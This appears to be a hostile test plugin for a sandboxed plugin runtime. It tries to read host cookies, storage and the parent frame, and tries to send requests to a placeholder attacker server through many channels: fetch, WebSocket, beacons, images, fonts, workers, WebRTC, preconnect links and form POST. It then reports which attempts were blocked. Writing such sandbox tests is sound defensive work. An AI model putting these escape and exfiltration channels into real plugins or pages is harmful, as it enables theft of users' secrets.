// A hostile test plugin: it tries every escape in docs/reference/studio-plugin-runtime.md
// and reports what it saw. Its own report is not the evidence that something is blocked;
// the browser tests also check what actually reached the attacker server.
// __ATTACKER__ is replaced by the harness. It runs only inside the sandboxed frame.
;(async () => {
  const A = '__ATTACKER__'
  const results = {}
  const within = (promise, ms = 1500) =>
    Promise.race([promise, new Promise((resolve) => setTimeout(() => resolve('timeout'), ms))])

  async function probe(name, attempt) {
    try {
      results[name] = await within(Promise.resolve().then(attempt))
    } catch (e) {
      results[name] = `blocked (${(e && e.name) || 'error'})`
    }
  }
  const onEvents = (el, ok, fail) =>
    new Promise((resolve) => {
      el.addEventListener(ok, () => resolve('succeeded'))
      el.addEventListener(fail, () => resolve('blocked'))
    })

  // ── The host and its secrets ──────────────────────────────────────
  await probe('parentDocument', () => (window.parent.document.title, 'succeeded'))
  await probe('topDocument', () => (window.top.document.title, 'succeeded'))
  await probe('parentLocation', () => (String(window.parent.location.href) ? 'succeeded' : 'blocked'))
  await probe('cookie', () => (document.cookie.includes('host-secret') ? 'succeeded' : `blocked (read "${document.cookie}")`))
  await probe('localStorage', () => (localStorage.getItem('scholera_secret'), 'succeeded'))
  await probe('sessionStorage', () => (sessionStorage.setItem('x', '1'), 'succeeded'))
  await probe('indexedDB', () =>
    new Promise((resolve) => {
      const open = indexedDB.open('probe')
      open.onsuccess = () => resolve('succeeded')
      open.onerror = () => resolve('blocked')
    }),
  )
  await probe('cacheStorage', () => (typeof caches === 'undefined' ? 'unavailable' : caches.open('probe').then(() => 'succeeded', () => 'blocked')))

  // ── Network ────────────────────────────────────────────────────────
  await probe('fetch', () => fetch(`${A}/fetch`).then(() => 'succeeded', () => 'blocked'))
  await probe('xhr', () =>
    new Promise((resolve) => {
      const x = new XMLHttpRequest()
      x.onload = () => resolve('succeeded')
      x.onerror = () => resolve('blocked')
      x.open('GET', `${A}/xhr`)
      x.send()
    }),
  )
  await probe('websocket', () => {
    const ws = new WebSocket(`${A.replace('http', 'ws')}/ws`)
    return onEvents(ws, 'open', 'error')
  })
  await probe('eventSource', () => {
    const es = new EventSource(`${A}/sse`)
    return onEvents(es, 'open', 'error').then((r) => (es.close(), r))
  })
  await probe('sendBeacon', () => (navigator.sendBeacon(`${A}/beacon`, 'x') ? 'attempted' : 'blocked'))
  await probe('image', () => {
    const img = new Image()
    const r = onEvents(img, 'load', 'error')
    img.src = `${A}/img.png`
    return r
  })
  await probe('cssBackgroundImage', () => {
    const div = document.createElement('div')
    div.style.backgroundImage = `url(${A}/bg.png)`
    document.body.appendChild(div)
    div.dataset.resolved = getComputedStyle(div).backgroundImage // forces the browser to resolve the url()
    return new Promise((resolve) => setTimeout(() => resolve('attempted'), 300))
  })
  await probe('script', () => {
    const s = document.createElement('script')
    const r = onEvents(s, 'load', 'error')
    s.src = `${A}/script.js`
    document.body.appendChild(s)
    return r
  })
  await probe('stylesheet', () => {
    const l = document.createElement('link')
    l.rel = 'stylesheet'
    const r = onEvents(l, 'load', 'error')
    l.href = `${A}/style.css`
    document.head.appendChild(l)
    return r
  })
  await probe('font', () => new FontFace('probe', `url(${A}/font.woff2)`).load().then(() => 'succeeded', () => 'blocked'))
  await probe('media', () => {
    const audio = new Audio()
    const r = onEvents(audio, 'canplay', 'error')
    audio.src = `${A}/audio.mp3`
    return r
  })

  // ── Code the policy must refuse ─────────────────────────────────────
  await probe('eval', () => (eval('1'), 'succeeded'))
  await probe('newFunction', () => (new Function('return 1')(), 'succeeded'))
  await probe('inlineScriptWithoutNonce', () => {
    window.__probeInline = false
    const s = document.createElement('script')
    s.textContent = 'window.__probeInline = true'
    document.body.appendChild(s)
    return new Promise((resolve) => setTimeout(() => resolve(window.__probeInline ? 'succeeded' : 'blocked'), 100))
  })

  // ── Workers ───────────────────────────────────────────────────────
  await probe('worker', () => {
    const w = new Worker(`${A}/worker.js`)
    return onEvents(w, 'message', 'error')
  })
  await probe('blobWorker', () => {
    const w = new Worker(URL.createObjectURL(new Blob(['postMessage(1)'], { type: 'text/javascript' })))
    return onEvents(w, 'message', 'error')
  })
  await probe('sharedWorker', () => {
    if (typeof SharedWorker === 'undefined') return 'unavailable'
    const w = new SharedWorker(`${A}/shared.js`)
    return onEvents(w, 'message', 'error')
  })
  await probe('serviceWorker', () =>
    !navigator.serviceWorker
      ? 'unavailable'
      : navigator.serviceWorker.register('/sw.js').then(() => 'succeeded', () => 'blocked'),
  )

  // ── Frames, windows, navigation of others ───────────────────────────
  await probe('nestedFrame', () => {
    const f = document.createElement('iframe')
    f.src = `${A}/frame`
    document.body.appendChild(f)
    return new Promise((resolve) => setTimeout(() => resolve('attempted'), 800))
  })
  await probe('popup', () => (window.open(`${A}/popup`) ? 'succeeded' : 'blocked'))
  await probe('topNavigation', () => {
    window.top.location.href = `${A}/top`
    return 'attempted'
  })

  // ── Channels the policy may not cover (N10, N11) ──────────────────────
  // Every name public/studio-runtime/v1/runtime.js and v2/runtime.js remove.
  const WEBRTC = [
    'RTCPeerConnection', 'webkitRTCPeerConnection', 'mozRTCPeerConnection', 'RTCDataChannel',
    'RTCSessionDescription', 'RTCIceCandidate', 'RTCRtpSender', 'RTCRtpReceiver',
    'RTCRtpTransceiver', 'RTCDtlsTransport', 'RTCIceTransport', 'RTCSctpTransport', 'RTCCertificate',
  ]
  await probe('webrtcConstructor', () => {
    const left = WEBRTC.filter((name) => typeof window[name] === 'function')
    return left.length === 0 ? 'removed' : `available (${left.join(', ')})`
  })
  await probe('webrtcFromChildFrame', () => {
    const f = document.createElement('iframe')
    document.body.appendChild(f)
    const C = f.contentWindow && f.contentWindow.RTCPeerConnection
    if (typeof C !== 'function') return 'blocked'
    const pc = new C({ iceServers: [{ urls: 'stun:127.0.0.1:4312' }] })
    pc.createDataChannel('probe')
    return pc.createOffer().then((o) => pc.setLocalDescription(o)).then(() => 'succeeded (peer connection created)')
  })
  const addLink = (rel, href) => {
    const l = document.createElement('link')
    if (rel) l.rel = rel
    l.href = href
    document.head.appendChild(l)
    return l
  }
  const stillThere = (l, ms) =>
    new Promise((resolve) => setTimeout(() => resolve(l.isConnected ? 'present' : 'removed by runtime'), ms))
  await probe('dnsPrefetchElement', () => stillThere(addLink('dns-prefetch', '//probe-dns.invalid'), 50))
  await probe('preconnectElement', () => stillThere(addLink('preconnect', A), 300))
  await probe('prefetchElement', () => stillThere(addLink('prefetch', `${A}/prefetch`), 300))
  // Inserted as a plain link first, so only the runtime's watch on `rel` changes can catch it.
  await probe('preconnectSetAfterInsert', async () => {
    const l = addLink(null, A)
    await new Promise((resolve) => setTimeout(resolve, 50))
    if (!l.isConnected) return 'removed before its rel was set'
    l.rel = 'preconnect'
    return stillThere(l, 300)
  })

  await ScholeraStudio.request('probe.report', { phase: 1, results })

  // ── Last: things that could navigate this frame if they worked ───────────
  const phase2 = {}
  try {
    const a = document.createElement('a')
    a.href = URL.createObjectURL(new Blob(['probe']))
    a.download = 'probe.txt'
    document.body.appendChild(a)
    a.click()
    phase2.download = 'attempted'
  } catch (e) {
    phase2.download = `blocked (${e.name})`
  }
  await ScholeraStudio.request('probe.report', { phase: 2, results: phase2 })
  try {
    const f = document.createElement('form')
    f.method = 'POST'
    f.action = `${A}/form`
    document.body.appendChild(f)
    f.submit()
  } catch {
    /* recorded by the attacker log, or by the host stopping the frame */
  }
})()
